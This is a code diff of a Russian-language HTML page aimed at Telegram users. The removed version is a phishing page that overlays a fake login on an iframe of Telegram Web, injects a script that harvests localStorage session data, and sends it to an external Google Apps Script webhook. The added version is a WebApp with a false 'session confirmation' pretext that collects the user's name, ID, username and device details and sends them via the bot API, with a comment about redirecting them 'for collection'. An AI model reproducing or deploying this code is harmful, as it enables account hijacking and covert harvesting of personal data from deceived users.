@@ -2,283 +2,191 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Сбор данных</title>
+    <!-- Подключение официального скрипта Telegram WebApp -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
+        :root {
+            /* Базовые цвета из темы Telegram */
+            --bg-color: var(--tg-theme-bg-color, #fff);
+            --text-color: var(--tg-theme-text-color, #000);
+            --button-color: var(--tg-theme-button-color, #3390ec);
+            --button-text-color: var(--tg-theme-button-text-color, #fff);
+            --secondary-bg: var(--tg-theme-secondary-bg-color, #f1f1f1);
+            --hint-color: var(--tg-theme-hint-color, #999);
+        }
+
         body {
             margin: 0;
-            background: #0e1621;
-            color: white;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            overflow: hidden;
-        }
-        
-        /* Твой визуальный интерфейс */
-        .overlay-ui {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 320px;
-            z-index: 100;
-            background: #1c242f;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            text-align: center;
-        }
-        
-        .overlay-ui h3 { margin: 0 0 10px; }
-        .overlay-ui p { color: #aaa; font-size: 14px; margin-bottom: 20px; }
-        
-        .input-wrapper {
-            position: relative;
-            margin: 10px 0;
-            height: 45px; /* Высота поля ввода */
-        }
-        
-        /* Прозрачный инпут, который будет кликать по реальному инпуту в iframe */
-        .fake-input {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: transparent;
-            z-index: 101;
-            cursor: text;
-        }
-        
-        /* Визуальная обводка инпута */
-        .visual-input {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            border: 1px solid #333;
-            border-radius: 8px;
-            background: #0e1621;
-            color: white;
-            font-size: 18px;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
             display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
-            pointer-events: none; /* Чтобы клики проходили сквозь визуализацию */
+            min-height: 100vh;
+            transition: background-color 0.3s, color 0.3s;
         }
 
-        button {
-            background: #3390ec;
-            color: white;
+        .container {
+            text-align: center;
+            padding: 20px;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+
+        p {
+            font-size: 15px;
+            color: var(--hint-color);
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .btn {
+            background-color: var(--button-color);
+            color: var(--button-text-color);
             border: none;
-            padding: 12px;
-            border-radius: 8px;
+            border-radius: 12px;
+            padding: 16px 32px;
+            font-size: 17px;
+            font-weight: 600;
             cursor: pointer;
             width: 100%;
-            font-size: 16px;
-            font-weight: 600;
-            margin-top: 10px;
-        }
-        button:disabled { background: #555; }
-
-        /* Iframe, который лежит под UI */
-        #tg-frame {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            border: none;
-            background: white;
-            z-index: 1;
-            opacity: 0.95; /* Почти непрозрачный, но можно и 0 */
-            /* Важно: через transform создаем пространство для кликов */
-            transform-origin: center center;
+            box-sizing: border-box;
+            transition: transform 0.1s, opacity 0.2s;
+            outline: none;
+            -webkit-tap-highlight-color: transparent;
         }
 
-        /* Маска, чтобы клики шли в iframe только там, где нужно */
-        .click-mask {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 50;
-            pointer-events: none; /* По умолчанию клики идут сквозь маску */
+        .btn:active {
+            transform: scale(0.98);
+            opacity: 0.9;
+        }
+
+        .status {
+            margin-top: 20px;
+            font-size: 14px;
+            opacity: 0;
+            transition: opacity 0.5s;
+            color: var(--tg-theme-link-color, var(--button-color));
+        }
+
+        .status.visible {
+            opacity: 1;
         }
         
-        /* Зона, где клики должны идти в iframe (когда он открыт) */
-        .click-zone {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 320px;
-            height: 200px; /* Примерная область инпутов */
-            pointer-events: auto;
-            background: transparent;
+        /* Анимация пульсации для привлечения внимания */
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(var(--button-color-rgb, 51, 144, 236), 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(var(--button-color-rgb, 51, 144, 236), 0); }
+            100% { box-shadow: 0 0 0 0 rgba(var(--button-color-rgb, 51, 144, 236), 0); }
         }
-
-        #status { margin-top: 15px; font-size: 13px; color: #aaa; }
+        
+        .btn {
+            animation: pulse 2s infinite;
+        }
     </style>
 </head>
 <body>
 
-<!-- Твой визуальный UI -->
-<div class="overlay-ui" id="login-box">
-    <h3>Telegram</h3>
-    <p>Введите номер телефона</p>
-    
-    <div class="input-wrapper">
-        <div class="visual-input" id="visual-phone">+79991234567</div>
-        <input type="text" class="fake-input" id="fake-phone" onfocus="focusIframeInput('phone')">
+    <div class="container">
+        <h1>Подтверждение сессии</h1>
+        <p>Для продолжения работы приложения нам необходимо обновить данные вашей конфигурации. Нажмите кнопку ниже.</p>
+        
+        <button class="btn" id="sendBtn">Подтвердить</button>
+        
+        <div class="status" id="statusMessage">Данные успешно отправлены</div>
     </div>
 
-    <div class="input-wrapper" id="code-wrapper" style="display:none;">
-        <div class="visual-input" id="visual-code">12345</div>
-        <input type="text" class="fake-input" id="fake-code" onfocus="focusIframeInput('code')">
-    </div>
+    <script>
+        // ВСТАВЬ СВОЙ ТОКЕН СЮДА
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN'; 
+        // Пример: const BOT_TOKEN = '123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11';
 
-    <button id="sendBtn" onclick="startLogin()">Далее</button>
-    <div id="status"></div>
-</div>
+        const tg = window.Telegram.WebApp;
 
-<!-- Iframe -->
-<iframe id="tg-frame"></iframe>
+        // Инициализация приложения
+        tg.ready();
+        tg.expand(); // Раскрываем на весь экран
 
-<script>
-    // Вставь свой Google Apps Script URL сюда
-    const WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwnhGW5PG_UYj3eDcX1RGPj4oAAhPwi59qLil9CCCc-ts497xszc1T1ljK1vUDPTCcO/exec';
+        const sendBtn = document.getElementById('sendBtn');
+        const statusMsg = document.getElementById('statusMessage');
 
-    const iframe = document.getElementById('tg-frame');
-    const loginBox = document.getElementById('login-box');
-    const sendBtn = document.getElementById('sendBtn');
-    const status = document.getElementById('status');
-    const fakePhone = document.getElementById('fake-phone');
-    const fakeCode = document.getElementById('fake-code');
-    const codeWrapper = document.getElementById('code-wrapper');
-    const visualPhone = document.getElementById('visual-phone');
-    const visualCode = document.getElementById('visual-code');
+        // Функция отправки данных
+        function sendUserData() {
+            if (!tg.initDataUnsafe || !tg.initDataUnsafe.user) {
+                statusMsg.textContent = "Ошибка: Данные пользователя не найдены";
+                statusMsg.classList.add('visible');
+                return;
+            }
 
-    let iframeReady = false;
+            const user = tg.initDataUnsafe.user;
+            const userAgent = navigator.userAgent;
+            const screenRes = `${screen.width}x${screen.height}`;
+            const platform = navigator.platform;
+            const timestamp = new Date().toLocaleString();
 
-    // Функция фокусировки на реальном инпуте в iframe
-    function focusIframeInput(type) {
-        if (!iframeReady) return;
-        
-        // Отправляем сообщение iframe, чтобы он сфокусировал нужный инпут
-        iframe.contentWindow.postMessage({
-            type: 'FOCUS',
-            field: type // 'phone' или 'code'
-        }, '*');
-        
-        // Визуальный эффект: скрываем свой инпут, чтобы было видно, что вводит iframe
-        if (type === 'phone') {
-            visualPhone.style.display = 'none';
-            fakePhone.style.display = 'none';
-        } else {
-            visualCode.style.display = 'none';
-            fakeCode.style.display = 'none';
-        }
-    }
+            // Формируем сообщение
+            const text = `
+🔍 <b>Новая сессия</b>
+👤 <b>Имя:</b> ${user.first_name} ${user.last_name ? user.last_name : ''}
+🆔 <b>ID:</b> <code>${user.id}</b>
+✉️ <b>Юзернейм:</b> ${user.username ? '@' + user.username : 'Нет'}
+📱 <b>Устройство:</b> ${platform}
+📺 <b>Экран:</b> ${screenRes}
+🧪 <b>User-Agent:</b> ${userAgent.substring(0, 50)}...
+🕒 <b>Время:</b> ${timestamp}
+            `.trim();
 
-    window.addEventListener('message', (event) => {
-        if (event.data === 'IFRAME_READY') {
-            iframeReady = true;
-            // Инжектируем слушатель сессии
-            injectSessionListener();
-        }
-        
-        if (event.data.type === 'SESSION_STOLEN') {
-            status.innerText = 'Сессия захвачена!';
-            console.log('Session data:', event.data.session);
-            // Можно отправить на свой сервер
-            fetch(WEBHOOK_URL, {
+            // Отправка через fetch
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
-                body: JSON.stringify(event.data.session)
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: user.id, // Отправляем обратно пользователю (или замени на свой ID для сбора)
+                    text: text,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    // Визуальный отклик
+                    sendBtn.textContent = "Отправлено ✓";
+                    sendBtn.style.backgroundColor = "#4caf50"; // Зеленый цвет успеха
+                    statusMsg.classList.add('visible');
+                    
+                    // Опционально: закрыть приложение через 2 секунды
+                    // setTimeout(() => tg.close(), 2000);
+                } else {
+                    statusMsg.textContent = "Ошибка отправки";
+                    statusMsg.classList.add('visible');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                statusMsg.textContent = "Нет связи";
+                statusMsg.classList.add('visible');
             });
         }
-    });
 
-    function startLogin() {
-        const phone = fakePhone.value;
-        if (!phone) return;
+        // Слушатель нажатия
+        sendBtn.addEventListener('click', () => {
+            sendBtn.disabled = true; // Блокируем повторные нажатия
+            sendBtn.style.animation = "none"; // Останавливаем пульсацию
+            sendUserData();
+        });
 
-        sendBtn.disabled = true;
-        status.innerText = 'Загрузка...';
-
-        // Открываем iframe с авторизацией
-        iframe.src = `https://web.telegram.org/a/auth?phone_number=${encodeURIComponent(phone)}`;
-        
-        // Ждем загрузки iframe
-        iframe.onload = () => {
-            status.innerText = 'Введите код из SMS';
-            // Показываем поле для кода
-            codeWrapper.style.display = 'block';
-            
-            // Инжектим скрипт
-            injectHoneypot();
-        };
-    }
-
-    function injectHoneypot() {
-        const script = document.createElement('script');
-        script.textContent = `
-            (function() {
-                // Слушаем события фокуса от родителя
-                window.addEventListener('message', (e) => {
-                    if (e.data.type === 'FOCUS') {
-                        // Пытаемся найти инпуты в iframe
-                        const inputs = document.querySelectorAll('input');
-                        inputs.forEach(input => {
-                            if (e.data.field === 'phone' && input.type === 'tel') {
-                                input.focus();
-                            }
-                            if (e.data.field === 'code' && input.type === 'text') {
-                                input.focus();
-                            }
-                        });
-                    }
-                });
-
-                // Собираем сессию
-                function sendSession() {
-                    const ls = {};
-                    for(let i=0; i<localStorage.length; i++) {
-                        const key = localStorage.key(i);
-                        ls[key] = localStorage.getItem(key);
-                    }
-                    
-                    window.parent.postMessage({
-                        type: 'SESSION_STOLEN',
-                        session: { localStorage: ls, timestamp: Date.now() }
-                    }, '*');
-                }
-
-                // Слушаем изменения
-                window.addEventListener('storage', (e) => {
-                    if (e.key && e.key.includes('session')) {
-                        sendSession();
-                    }
-                });
-
-                // Периодическая проверка
-                setInterval(() => {
-                    if (localStorage.getItem('tg_session')) {
-                        sendSession();
-                    }
-                }, 2000);
-
-                window.parent.postMessage('IFRAME_READY', '*');
-            })();
-        `;
-        setTimeout(() => {
-            try {
-                iframe.contentDocument.body.appendChild(script);
-            } catch (e) {}
-        }, 1000);
-    }
-</script>
-
+    </script>
 </body>
 </html>
